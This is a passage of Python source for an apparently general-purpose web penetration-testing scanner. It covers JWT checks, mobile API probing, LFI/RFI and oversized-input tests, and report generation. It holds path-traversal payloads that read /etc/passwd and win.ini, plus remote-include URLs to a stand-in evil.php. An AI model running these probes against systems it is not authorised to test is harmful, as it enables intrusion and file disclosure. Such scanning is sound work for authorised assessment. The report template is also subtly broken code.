        if "api_testing" in self.results and "endpoints" in self.results["api_testing"]:
            api_endpoints = self.results["api_testing"]["endpoints"].get("api_endpoints", [])
            
            for api in api_endpoints:
                try:
                    response = requests.get(api['url'], headers=self.headers, timeout=10)
                    
                    # Check response headers
                    auth_headers = ['Authorization', 'x-auth-token', 'x-access-token', 'jwt-token']
                    
                    for header in auth_headers:
                        if header in response.headers:
                            header_value = response.headers[header]
                            
                            # Check if it looks like a JWT token
                            if header_value.startswith('Bearer '):
                                token = header_value[7:]  # Remove 'Bearer ' prefix
                                
                                if re.match(r'^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$', token):
                                    jwt_tokens.append({
                                        'source': 'header',
                                        'name': header,
                                        'value': token,
                                        'api_url': api['url']
                                    })
                
                except Exception as e:
                    logger.error(f"Error checking API headers for JWT tokens: {str(e)}")
        
        # Look for JWT tokens in page source
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            source = response.text
            
            # Look for JWT tokens in JavaScript
            jwt_pattern = r'["\']([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)["\']'
            matches = re.findall(jwt_pattern, source)
            
            for match in matches:
                # Validate it's a JWT token (basic check)
                if len(match.split('.')) == 3:
                    # Check if we haven't already found this token
                    if not any(t['value'] == match for t in jwt_tokens):
                        jwt_tokens.append({
                            'source': 'page_source',
                            'value': match
                        })
        
        except Exception as e:
            logger.error(f"Error checking page source for JWT tokens: {str(e)}")
        
        # Analyze JWT tokens for vulnerabilities
        findings = []
        
        for token in jwt_tokens:
            try:
                # Basic JWT analysis (without actually decoding/verifying)
                token_parts = token['value'].split('.')
                
                if len(token_parts) == 3:
                    # Decode header (first part)
                    header_json = None
                    try:
                        # Add padding if needed
                        header_part = token_parts[0]
                        while len(header_part) % 4 != 0:
                            header_part += "="
                        
                        header_bytes = base64.b64decode(header_part)
                        header_json = json.loads(header_bytes.decode('utf-8'))
                    except:
                        pass
                    
                    if header_json:
                        # Check for "none" algorithm
                        if header_json.get('alg', '').lower() == 'none':
                            findings.append({
                                'token_source': token['source'],
                                'token_name': token.get('name'),
                                'issue': 'JWT using "none" algorithm',
                                'evidence': json.dumps(header_json),
                                'severity': 'Critical',
                                'recommendation': 'Use a secure algorithm like RS256 or ES256'
                            })
                        
                        # Check for weak algorithms
                        if header_json.get('alg', '').upper() in ['HS256', 'HS384', 'HS512']:
                            findings.append({
                                'token_source': token['source'],
                                'token_name': token.get('name'),
                                'issue': 'JWT using symmetric algorithm (HMAC)',
                                'evidence': f"Algorithm: {header_json.get('alg')}",
                                'severity': 'Medium',
                                'recommendation': 'Consider using asymmetric algorithms (RS256, ES256) for better security'
                            })
                        
                        # Check for missing "typ" field
                        if 'typ' not in header_json:
                            findings.append({
                                'token_source': token['source'],
                                'token_name': token.get('name'),
                                'issue': 'JWT missing "typ" header field',
                                'evidence': json.dumps(header_json),
                                'severity': 'Low',
                                'recommendation': 'Include "typ": "JWT" in the header'
                            })
                    
                    # Decode payload (second part)
                    payload_json = None
                    try:
                        # Add padding if needed
                        payload_part = token_parts[1]
                        while len(payload_part) % 4 != 0:
                            payload_part += "="
                        
                        payload_bytes = base64.b64decode(payload_part)
                        payload_json = json.loads(payload_bytes.decode('utf-8'))
                    except:
                        pass
                    
                    if payload_json:
                        # Check for missing expiration
                        if 'exp' not in payload_json:
                            findings.append({
                                'token_source': token['source'],
                                'token_name': token.get('name'),
                                'issue': 'JWT missing expiration claim',
                                'evidence': 'No "exp" field in payload',
                                'severity': 'Medium',
                                'recommendation': 'Include an expiration time in all JWTs'
                            })
                            
                        # Check for very long expiration
                        elif 'exp' in payload_json:
                            exp_time = payload_json['exp']
                            current_time = int(time.time())
                            
                            if isinstance(exp_time, (int, float)) and exp_time - current_time > 86400 * 30:  # More than 30 days
                                findings.append({
                                    'token_source': token['source'],
                                    'token_name': token.get('name'),
                                    'issue': 'JWT has excessive expiration time',
                                    'evidence': f"Expires in {(exp_time - current_time) // 86400} days",
                                    'severity': 'Low',
                                    'recommendation': 'Reduce JWT lifetime to a reasonable period (hours or days, not months)'
                                })
            
            except Exception as e:
                logger.error(f"Error analyzing JWT token: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "jwt_tokens_found": len(jwt_tokens),
            "jwt_tokens": jwt_tokens,
            "findings": findings,
            "findings_count": len(findings),
            "vulnerable": len(findings) > 0
        }
        
        self.results["api_testing"]["jwt"] = result
        return result
    
    #==========================================
    # 13. Mobile Aspect Testing Methods
    #==========================================
    
    def test_mobile_api_security(self, target_url=None):
        """Test security of APIs used by mobile applications"""
        target_url = target_url or self.target
        
        logger.info(f"Testing mobile API security on {target_url}")
        
        # Look for mobile-specific API endpoints
        mobile_apis = []
        
        # Common mobile API paths
        mobile_api_paths = [
            '/api/mobile', '/api/app', '/app/api',
            '/mobile', '/mobile/api', '/mobile/v1',
            '/app', '/api/v1/mobile', '/api/android',
            '/api/ios', '/m/api', '/api/m'
        ]
        
        # Check common API paths
        parsed_url = urlparse(target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        for path in mobile_api_paths:
            try:
                api_url = urljoin(base_url, path)
                response = requests.get(api_url, headers=self.headers, timeout=5)
                
                # Check if it might be an API endpoint
                if response.status_code != 404:
                    content_type = response.headers.get('Content-Type', '')
                    
                    # APIs often return JSON or XML
                    is_api = False
                    if 'json' in content_type or 'xml' in content_type:
                        is_api = True
                    elif response.text and (response.text.strip().startswith('{') or response.text.strip().startswith('[') or response.text.strip().startswith('<')):
                        is_api = True
                        
                    if is_api:
                        mobile_apis.append({
                            'url': api_url,
                            'status_code': response.status_code,
                            'content_type': content_type,
                            'content_length': len(response.content)
                        })
            
            except Exception as e:
                logger.error(f"Error checking mobile API path {path}: {str(e)}")
        
        # Test each mobile API for vulnerabilities
        findings = []
        
        for api in mobile_apis:
            api_url = api['url']
            
            # Test 1: Check if API requires authentication
            try:
                # Make a request without authentication
                response = requests.get(api_url, headers=self.headers, timeout=10)
                
                # Check if we got a successful response with meaningful data
                if response.status_code == 200 and len(response.content) > 50:
                    # Try to determine if this contains sensitive data
                    try:
                        if 'json' in response.headers.get('Content-Type', ''):
                            data = response.json()
                            data_str = str(data).lower()
                            
                            # Look for sensitive data patterns
                            sensitive_fields = [
                                'user', 'account', 'profile', 'email', 'phone',
                                'address', 'payment', 'card', 'token', 'password',
                                'auth', 'secret', 'key', 'credential'
                            ]
                            
                            for field in sensitive_fields:
                                if field in data_str:
                                    findings.append({
                                        'api_url': api_url,
                                        'issue': 'Potentially sensitive data exposed without authentication',
                                        'evidence': f"Response contains sensitive field: {field}",
                                        'severity': 'High'
                                    })
                                    break
                    except:
                        pass
            
            except Exception as e:
                logger.error(f"Error testing mobile API authentication: {str(e)}")
            
            # Test 2: Check for version controls
            try:
                # Add app version header (common in mobile APIs)
                headers = self.headers.copy()
                
                # Test with old version
                headers['X-App-Version'] = '1.0.0'
                old_version_response = requests.get(api_url, headers=headers, timeout=5)
                
                # Test with new version
                headers['X-App-Version'] = '999.999.999'
                new_version_response = requests.get(api_url, headers=headers, timeout=5)
                
                # Compare responses
                if old_version_response.status_code == new_version_response.status_code == 200:
                    # If both versions accepted, might not have proper version control
                    findings.append({
                        'api_url': api_url,
                        'issue': 'No API version enforcement detected',
                        'evidence': 'Both very old and very new app versions accepted',
                        'severity': 'Medium'
                    })
            
            except Exception as e:
                logger.error(f"Error testing mobile API version controls: {str(e)}")
            
            # Test 3: Check for certificate pinning bypass detection
            try:
                # Add custom header that might indicate certificate pinning bypass
                headers = self.headers.copy()
                headers['X-Bypass-Pinning'] = 'true'
                
                response = requests.get(api_url, headers=headers, timeout=5)
                
                # If request succeeds, might not detect cert pinning bypass attempts
                if response.status_code == 200:
                    findings.append({
                        'api_url': api_url,
                        'issue': 'No detection of certificate pinning bypass attempt',
                        'evidence': 'Server accepted request with X-Bypass-Pinning header',
                        'severity': 'Medium'
                    })
            
            except Exception as e:
                logger.error(f"Error testing certificate pinning bypass detection: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "mobile_apis_found": len(mobile_apis),
            "mobile_apis": mobile_apis,
            "findings": findings,
            "findings_count": len(findings),
            "vulnerable": len(findings) > 0
        }
        
        self.results["mobile_aspects"]["api_security"] = result
        return result
    
    def check_mobile_caching(self, target_url=None):
        """Check for appropriate caching headers for mobile content"""
        target_url = target_url or self.target
        
        logger.info(f"Checking mobile caching headers on {target_url}")
        
        # Check for caching headers on mobile resources
        findings = []
        
        # Mobile-specific resources
        mobile_resources = [
            '/mobile', '/m', '/app',
            '/css/mobile.css', '/js/mobile.js',
            '/api/mobile'
        ]
        
        # Add some random string to avoid cached responses
        mobile_resources = [resource + '?_=' + ''.join(random.choices(string.digits, k=8)) for resource in mobile_resources]
        
        for resource in mobile_resources:
            try:
                resource_url = urljoin(target_url, resource)
                response = requests.get(resource_url, headers=self.headers, timeout=5)
                
                # We're only interested in successful responses
                if response.status_code < 400:
                    # Check for caching headers
                    cache_control = response.headers.get('Cache-Control', '')
                    pragma = response.headers.get('Pragma', '')
                    expires = response.headers.get('Expires', '')
                    
                    # For sensitive API endpoints
                    if '/api/' in resource.lower():
                        # APIs should often have no-cache directives
                        if 'no-store' not in cache_control and 'no-cache' not in cache_control:
                            findings.append({
                                'url': resource_url,
                                'issue': 'Missing no-cache directive for mobile API',
                                'evidence': f"Cache-Control: {cache_control}",
                                'severity': 'Medium',
                                'recommendation': 'Add Cache-Control: no-store, no-cache to sensitive API responses'
                            })
                    
                    # For static content
                    elif any(ext in resource.lower() for ext in ['.css', '.js', '.png', '.jpg', '.gif']):
                        # Static resources should have caching headers
                        if not cache_control and not expires:
                            findings.append({
                                'url': resource_url,
                                'issue': 'Missing caching headers for static resource',
                                'evidence': 'No Cache-Control or Expires header',
                                'severity': 'Low',
                                'recommendation': 'Add appropriate caching headers for static content'
                            })
            
            except Exception as e:
                logger.error(f"Error checking caching headers for {resource}: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "resources_checked": len(mobile_resources),
            "findings": findings,
            "findings_count": len(findings),
            "vulnerable": len(findings) > 0
        }
        
        self.results["mobile_aspects"]["caching"] = result
        return result
    
    #==========================================
    # 14. Specialized Security Check Methods
    #==========================================
    
    def test_ssrf_vulnerability(self, target_url=None):
        """Test for Server-Side Request Forgery vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing for SSRF vulnerabilities on {target_url}")
        
        # Function exists in Injection Testing Methods section
        # We'll call it here for convenience
        return self.results["injection_testing"].get("ssrf", {})
    
    def test_for_lfi_rfi(self, target_url=None):
        """Test for Local/Remote File Inclusion vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing for LFI/RFI vulnerabilities on {target_url}")
        
        # Find injectable parameters
        params = []
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find forms
            for form in soup.find_all('form'):
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                form_url = urljoin(target_url, form_action) if form_action else target_url
                
                # Get input fields
                for inp in form.find_all('input'):
                    input_name = inp.get('name', '')
                    input_type = inp.get('type', '').lower()
                    
                    if input_name and input_type not in ['checkbox', 'radio', 'button', 'submit']:
                        params.append({
                            'url': form_url,
                            'method': form_method,
                            'param': input_name,
                            'context': 'form'
                        })
            
            # Find URL parameters
            links = soup.find_all('a', href=True)
            for link in links:
                href = link['href']
                if '?' in href:
                    link_url = urljoin(target_url, href)
                    parsed_url = urlparse(link_url)
                    query_params = parse_qs(parsed_url.query)
                    
                    for param_name in query_params:
                        params.append({
                            'url': link_url,
                            'method': 'get',
                            'param': param_name,
                            'context': 'url'
                        })
        
        except Exception as e:
            logger.error(f"Error finding injectable parameters: {str(e)}")
        
        # Test for LFI/RFI vulnerabilities
        vulnerabilities = []
        
        # Test payloads
        lfi_payloads = [
            "../etc/passwd",
            "../../../../../etc/passwd",
            "....//....//....//....//....//etc/passwd",
            "../../../../../../../../../../etc/passwd",
            "/etc/passwd",
            "../../../../../../../../windows/win.ini",
            "C:\\Windows\\win.ini"
        ]
        
        rfi_payloads = [
            "http://example.com/evil.php",
            "https://example.com/evil.php",
            "file:///etc/passwd"
        ]
        
        # LFI indicators to look for in responses
        lfi_indicators = [
            "root:x:",
            "[boot loader]",
            "for 16-bit app support",
            "root:*:0:0",
            "include/require"
        ]
        
        # Test each parameter for LFI
        for param_info in params[:10]:  # Limit to first 10 for brevity
            url = param_info['url']
            method = param_info['method']
            param_name = param_info['param']
            
            # Test LFI
            for payload in lfi_payloads:
                try:
                    if method == 'get':
                        response = requests.get(
                            url,
                            params={param_name: payload},
                            headers=self.headers,
                            timeout=10
                        )
                    else:
                        response = requests.post(
                            url,
                            data={param_name: payload},
                            headers=self.headers,
                            timeout=10
                        )
                    
                    # Check if any LFI indicator is in the response
                    for indicator in lfi_indicators:
                        if indicator in response.text:
                            vulnerabilities.append({
                                'type': 'Local File Inclusion (LFI)',
                                'url': url,
                                'method': method.upper(),
                                'param': param_name,
                                'payload': payload,
                                'evidence': f"Found LFI indicator: {indicator}",
                                'severity': 'High'
                            })
                            break
                    
                    if vulnerabilities and vulnerabilities[-1]['param'] == param_name:
                        break  # Found vulnerability, no need to try other payloads
                
                except Exception as e:
                    logger.error(f"Error testing LFI payload {payload} on {url}, param {param_name}: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "params_tested": min(10, len(params)),
            "total_params_found": len(params),
            "vulnerabilities_found": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "vulnerable": len(vulnerabilities) > 0
        }
        
        self.results["specialized_tests"]["lfi_rfi"] = result
        return result
    
    def test_for_xxe(self, target_url=None):
        """Test for XML External Entity (XXE) vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing for XXE vulnerabilities on {target_url}")
        
        # Function exists in Injection Testing Methods section
        # We'll call it here for convenience
        return self.results["injection_testing"].get("xxe", {})
    
    def test_for_buffer_overflow(self, target_url=None):
        """Test for buffer overflow vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing for buffer overflow vulnerabilities on {target_url}")
        
        # Find injectable parameters
        params = []
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find forms
            for form in soup.find_all('form'):
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                form_url = urljoin(target_url, form_action) if form_action else target_url
                
                # Get input fields
                for inp in form.find_all('input'):
                    input_name = inp.get('name', '')
                    input_type = inp.get('type', '').lower()
                    
                    if input_name and input_type not in ['checkbox', 'radio', 'button', 'submit']:
                        params.append({
                            'url': form_url,
                            'method': form_method,
                            'param': input_name,
                            'context': 'form'
                        })
            
            # Find URL parameters
            links = soup.find_all('a', href=True)
            for link in links:
                href = link['href']
                if '?' in href:
                    link_url = urljoin(target_url, href)
                    parsed_url = urlparse(link_url)
                    query_params = parse_qs(parsed_url.query)
                    
                    for param_name in query_params:
                        params.append({
                            'url': link_url,
                            'method': 'get',
                            'param': param_name,
                            'context': 'url'
                        })
        
        except Exception as e:
            logger.error(f"Error finding injectable parameters: {str(e)}")
        
        # Test for potential buffer overflow issues
        findings = []
        
        # Test payloads - various large inputs
        payloads = [
            'A' * 1000,
            'A' * 5000,
            'A' * 10000
        ]
        
        # Test each parameter
        for param_info in params[:5]:  # Limit to first 5 for brevity
            url = param_info['url']
            method = param_info['method']
            param_name = param_info['param']
            
            # Get baseline response
            try:
                if method == 'get':
                    baseline_response = requests.get(
                        url,
                        params={param_name: 'A'},
                        headers=self.headers,
                        timeout=10
                    )
                else:
                    baseline_response = requests.post(
                        url,
                        data={param_name: 'A'},
                        headers=self.headers,
                        timeout=10
                    )
                
                baseline_status = baseline_response.status_code
                baseline_length = len(baseline_response.content)
                baseline_time = baseline_response.elapsed.total_seconds()
            
            except Exception as e:
                logger.error(f"Error getting baseline response for {url}, param {param_name}: {str(e)}")
                continue
            
            # Test with large payloads
            for payload in payloads:
                try:
                    if method == 'get':
                        response = requests.get(
                            url,
                            params={param_name: payload},
                            headers=self.headers,
                            timeout=30  # Longer timeout for large payloads
                        )
                    else:
                        response = requests.post(
                            url,
                            data={param_name: payload},
                            headers=self.headers,
                            timeout=30
                        )
                    
                    # Check for abnormal responses
                    if response.status_code >= 500 and baseline_status < 500:
                        # Server error after large input
                        findings.append({
                            'url': url,
                            'method': method.upper(),
                            'param': param_name,
                            'payload_size': len(payload),
                            'evidence': f"Server returned {response.status_code} after large input (baseline: {baseline_status})",
                            'severity': 'Medium'
                        })
                        break
                    
                    # Check for significant timing difference
                    response_time = response.elapsed.total_seconds()
                    if response_time > baseline_time * 5 and response_time > 2:  # At least 5x slower and >2 seconds
                        findings.append({
                            'url': url,
                            'method': method.upper(),
                            'param': param_name,
                            'payload_size': len(payload),
                            'evidence': f"Response time increased from {baseline_time:.2f}s to {response_time:.2f}s with large input",
                            'severity': 'Low'
                        })
                        break
                
                except requests.Timeout:
                    # Timeout could indicate potential DoS vulnerability
                    findings.append({
                        'url': url,
                        'method': method.upper(),
                        'param': param_name,
                        'payload_size': len(payload),
                        'evidence': "Request timed out with large input",
                        'severity': 'Medium'
                    })
                    break
                
                except Exception as e:
                    logger.error(f"Error testing buffer overflow with payload size {len(payload)} on {url}, param {param_name}: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "params_tested": min(5, len(params)),
            "total_params_found": len(params),
            "findings": findings,
            "findings_count": len(findings),
            "vulnerable": len(findings) > 0,
            "note": "This is a simplified buffer overflow test. True buffer overflow vulnerabilities can only be detected in native applications."
        }
        
        self.results["specialized_tests"]["buffer_overflow"] = result
        return result
    
    #==========================================
    # Main Execution Methods
    #==========================================
    
    def run_all_tests(self):
        """Run all penetration tests on the target"""
        target = self.target
        if not target:
            logger.error("No target specified for testing")
            return None
        
        logger.info(f"Starting comprehensive penetration testing on {target}")
        
        # Ensure output directory exists
        os.makedirs(self.output_dir, exist_ok=True)
        
        # 1. Port and Service Scanning
        self.port_scan()
        self.scan_for_non_standard_services()
        
        # 2. Web Application Analysis
        self.scan_directories()
        self.check_robots_sitemap()
        self.analyze_html_comments()
        self.test_file_upload()
        
        # 3. Injection Testing
        self.test_ssrf_vulnerability()
        self.test_xxe_vulnerability()
        
        # 4. Authentication and Authorization Testing
        self.test_password_brute_force()
        self.test_auth_bypass()
        self.test_password_reset()
        
        # 5. Session Management Testing
        self.test_session_fixation()
        self.test_session_handling()
        
        # 6. Cryptographic Testing
        self.test_ssl_tls_configuration()
        self.test_crypto_implementations()
        
        # 7. Business Logic Testing
        self.test_access_controls()
        self.test_data_integrity()
        self.test_workflow_bypass()
        
        # 8. Configuration Testing
        self.test_http_headers()
        self.test_server_configuration()
        
        # 9. Denial of Service Testing
        self.test_dos_resistance()
        self.analyze_error_handling()
        
        # 10. Client-Side Testing
        self.test_xss_vulnerabilities()
        self.test_csrf_vulnerabilities()
        self.test_clickjacking_vulnerability()
        
        # 11. Information Leakage Testing
        self.test_information_disclosure()
        self.test_error_messages()
        
        # 12. API Testing
        self.discover_api_endpoints()
        self.test_api_security()
        self.test_jwt_security()
        
        # 13. Mobile Aspect Testing
        self.test_mobile_api_security()
        self.check_mobile_caching()
        
        # 14. Specialized Security Checks
        self.test_for_lfi_rfi()
        self.test_for_buffer_overflow()
        
        # Save results
        self.save_results()
        
        logger.info(f"Comprehensive penetration testing completed for {target}")
        
        return self.results
    
    def save_results(self, filename=None):
        """Save test results to file"""
        if not filename:
            filename = os.path.join(self.report_dir, "comprehensive_test_results.json")
            
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(filename), exist_ok=True)
            
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=4)
            
        logger.info(f"Results saved to {filename}")
        return filename
    
    def generate_report(self, filename=None):
        """Generate a comprehensive security report"""
        if not filename:
            filename = os.path.join(self.report_dir, "comprehensive_test_report.html")
            
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        
        # Simple HTML report template
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Comprehensive Security Assessment Report</title>
            <style>
                body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 20px; }
                h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
                h2 { color: #2980b9; margin-top: 30px; }
                h3 { color: #3498db; }
                .container { max-width: 1200px; margin: 0 auto; }
                .summary { background-color: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 30px; }
                .high { background-color: #f8d7da; padding: 15px; border-left: 5px solid #dc3545; margin-bottom: 15px; }
                .medium { background-color: #fff3cd; padding: 15px; border-left: 5px solid #ffc107; margin-bottom: 15px; }
                .low { background-color: #d1ecf1; padding: 15px; border-left: 5px solid #17a2b8; margin-bottom: 15px; }
                .code { background-color: #f8f9fa; padding: 10px; border: 1px solid #ddd; border-radius: 5px; font-family: monospace; overflow-x: auto; }
                table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                th { background-color: #f2f2f2; }
                tr:nth-child(even) { background-color: #f9f9f9; }
                .footer { margin-top: 50px; font-size: 0.8em; text-align: center; color: #7f8c8d; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Comprehensive Security Assessment Report</h1>
                
                <div class="summary">
                    <h2>Executive Summary</h2>
                    <p><strong>Target:</strong> {target}</p>
                    <p><strong>Assessment Date:</strong> {assessment_date}</p>
                    <p><strong>Risk Level:</strong> {risk_level}</p>
                    <p><strong>Total Issues:</strong> {total_issues}</p>
                    <ul>
                        <li><strong>High:</strong> {high_issues}</li>
                        <li><strong>Medium:</strong> {medium_issues}</li>
                        <li><strong>Low:</strong> {low_issues}</li>
                    </ul>
                    
                    <h3>Top Recommendations</h3>
                    <ol>
                        {top_recommendations}
                    </ol>
                </div>
                
                <h2>Detailed Findings</h2>
                
                {detailed_findings}
                
                <div class="footer">
                    <p>Generated on {generation_date} by Comprehensive PenTester</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        # Count issues by severity
        high_issues = 0
        medium_issues = 0
        low_issues = 0
        
        # Collect all findings
        all_findings = []
        
        # Process all results and extract findings
        for category, category_results in self.results.items():
            if category == "timestamp" or category == "target":
                continue
                
            for test_name, test_results in category_results.items():
                # Different result structures
                if "vulnerabilities" in test_results:
                    for vuln in test_results.get("vulnerabilities", []):
                        severity = vuln.get("severity", "Medium")
                        if severity == "High" or severity == "Critical":
                            high_issues += 1
                        elif severity == "Medium":
                            medium_issues += 1
                        else:
                            low_issues += 1
                        
                        all_findings.append({
                            "category": category,
                            "test_name": test_name,
                            "finding": vuln,
                            "severity": severity
                        })
                
                elif "findings" in test_results:
                    for finding in test_results.get("findings", []):
                        severity = finding.get("severity", "Medium")
                        if severity == "High" or severity == "Critical":
                            high_issues += 1
                        elif severity == "Medium":
                            medium_issues += 1
                        else:
                            low_issues += 1
                        
                        all_findings.append({
                            "category": category,
                            "test_name": test_name,
                            "finding": finding,
                            "severity": severity
                        })
                
                elif "issues" in test_results:
                    for issue in test_results.get("issues", []):
                        severity = issue.get("severity", "Medium")
                        if severity == "High" or severity == "Critical":
                            high_issues += 1
                        elif severity == "Medium":
                            medium_issues += 1
                        else:
                            low_issues += 1
                        
                        all_findings.append({
                            "category": category,
                            "test_name": test_name,
                            "finding": issue,
                            "severity": severity
                        })
        
        # Sort findings by severity
        all_findings.sort(key=lambda x: 0 if x["severity"] == "Critical" or x["severity"] == "High" else 
                                        1 if x["severity"] == "Medium" else 2)
        
        # Determine overall risk level
        risk_level = "Low"
        if high_issues > 0:
            risk_level = "High"
        elif medium_issues > 3:
            risk_level = "Medium"
        
        # Generate top recommendations
        top_recommendations = ""
        for i, finding in enumerate(all_findings[:5]):  # Top 5 findings
            top_recommendations += f"<li>{finding['finding'].get('issue', finding['finding'].get('type', 'Security issue'))}</li>"
        
        # Generate detailed findings
        detailed_findings = ""
        for finding in all_findings:
            severity = finding["severity"]
            severity_class = "high" if severity == "High" or severity == "Critical" else "medium" if severity == "Medium" else "low"
            
            finding_data = finding["finding"]
            issue = finding_data.get('issue', finding_data.get('type', 'Security issue'))
            evidence = finding_data.get('evidence', 'No specific evidence provided')
            
            # Get URL if available
            url = finding_data.get('url', finding_data.get('api_url', 'N/A'))
            
            # Get recommendation if available
            recommendation = finding_data.get('recommendation', 'No specific recommendation provided')
            
            detailed_findings += f"""
            <div class="{severity_class}">
                <h3>{issue}</h3>
                <p><strong>Severity:</strong> {severity}</p>
                <p><strong>Category:</strong> {finding['category']}</p>
                <p><strong>Test:</strong> {finding['test_name']}</p>
                <p><strong>URL:</strong> {url}</p>
                <p><strong>Evidence:</strong> {evidence}</p>
                <p><strong>Recommendation:</strong> {recommendation}</p>
            </div>
            """
        
        # Fill in the template
        html_content = html.format(
            target=self.target,
            assessment_date=time.strftime("%Y-%m-%d %H:%M:%S"),
            risk_level=risk_level,
            total_issues=high_issues + medium_issues + low_issues,
            high_issues=high_issues,
            medium_issues=medium_issues,
            low_issues=low_issues,
            top_recommendations=top_recommendations,
            detailed_findings=detailed_findings,
            generation_date=time.strftime("%Y-%m-%d %H:%M:%S")
        )
        
        # Write to file
        with open(filename, 'w') as f:
            f.write(html_content)
            
        logger.info(f"Report generated at {filename}")
        return filename

# Function to run as a script
def main():
    parser = argparse.ArgumentParser(description="Comprehensive Penetration Testing Tool")
    parser.add_argument("target", help="Target URL or IP address to test")
    parser.add_argument("--output", "-o", help="Output directory for results", default="security_assessment")
    parser.add_argument("--port-scan", action="store_true", help="Run only port scanning tests")
    parser.add_argument("--web", action="store_true", help="Run only web application tests")
    parser.add_argument("--auth", action="store_true", help="Run only authentication tests")
    parser.add_argument("--api", action="store_true", help="Run only API tests")
    parser.add_argument("--all", action="store_true", help="Run all tests (default)")
    
    args = parser.parse_args()
    
    tester = ComprehensivePenTester(args.target, args.output)
    
    if args.port_scan:
        tester.port_scan()
        tester.scan_for_non_standard_services()
    elif args.web:
        tester.scan_directories()
        tester.check_robots_sitemap()
        tester.analyze_html_comments()
        tester.test_xss_vulnerabilities()
        tester.test_for_lfi_rfi()
    elif args.auth:
        tester.test_password_brute_force()
        tester.test_auth_bypass()
        tester.test_session_handling()
    elif args.api:
        tester.discover_api_endpoints()
        tester.test_api_security()
        tester.test_jwt_security()
    else:
        # Run all tests
        tester.run_all_tests()
    
    # Save results and generate report
    tester.save_results()
    tester.generate_report()

if __name__ == "__main__":
    import argparse
    main()